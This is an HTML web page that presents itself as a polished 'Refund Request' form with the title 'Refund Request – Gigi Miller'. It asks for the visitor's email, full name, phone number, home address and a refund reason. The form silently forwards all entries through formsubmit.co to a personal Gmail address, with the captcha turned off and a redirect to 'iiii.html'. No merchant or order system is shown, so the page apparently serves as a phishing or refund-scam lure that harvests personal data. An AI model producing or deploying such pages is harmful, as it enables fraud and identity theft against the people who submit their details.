<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Refund Request ‚Äì Gigi Miller</title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/633/633611.png" type="image/png" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at top left, #6366f1, #a855f7, #ec4899);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 1rem;
    }
    .card {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
      padding: 2rem;
      max-width: 420px;
      width: 100%;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 30px 60px rgba(0,0,0,0.3);
    }
    .card-header {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-bottom: 2rem;
    }
    .logo {
      background: linear-gradient(to right, #9333ea, #ec4899);
      padding: 0.5rem;
      border-radius: 50%;
      color: white;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    h1 {
      font-size: 1.75rem;
      font-weight: 800;
      color: #1f2937;
    }
    h1 span {
      color: #9333ea;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      color: #374151;
      font-weight: 600;
      font-size: 0.9rem;
    }
    input, textarea {
      width: 100%;
      padding: 0.5rem;
      border-radius: 8px;
      border: 1px solid #d1d5db;
      background: rgba(255, 255, 255, 0.8);
      margin-bottom: 1rem;
      transition: border-color 0.3s ease, box-shadow 0.3s ease;
      font-family: 'Inter', sans-serif;
    }
    input:focus, textarea:focus {
      border-color: #9333ea;
      box-shadow: 0 0 0 3px rgba(147, 51, 234, 0.3);
      outline: none;
    }
    button {
      width: 100%;
      background: linear-gradient(to right, #9333ea, #ec4899);
      color: white;
      font-weight: 600;
      padding: 0.75rem;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease;
      margin-top: 1rem;
    }
    button:hover {
      background: linear-gradient(to right, #7e22ce, #db2777);
      transform: scale(1.02);
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="card-header">
      <div class="logo">üîÅ</div>
      <h1><span>Refund Request</span></h1>
    </div>
    <form action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST">
      <!-- Redirect after submission -->
      <input type="hidden" name="_next" value="iiii.html">
      <input type="hidden" name="_captcha" value="false">

      <label for="email">Email</label>
      <input type="email" name="Email" id="email" placeholder="you@example.com" required />

      <label for="name">Full Name</label>
      <input type="text" name="Full Name" id="name" placeholder="Gigi Miller" required />

      <label for="phone">Phone Number</label>
      <input type="tel" name="Phone Number" id="phone" placeholder="+1 234 567 8901" required />

      <label for="address">Address</label>
      <textarea name="Address" id="address" rows="3" placeholder="123 Main St, City, State, ZIP" required></textarea>

      <label for="reason">Reason for Refund</label>
      <textarea name="Refund Reason" id="reason" rows="4" placeholder="Explain your reason..." required></textarea>

      <button type="submit">Submit Refund Request</button>
    </form>
  </div>
</body>
</html>
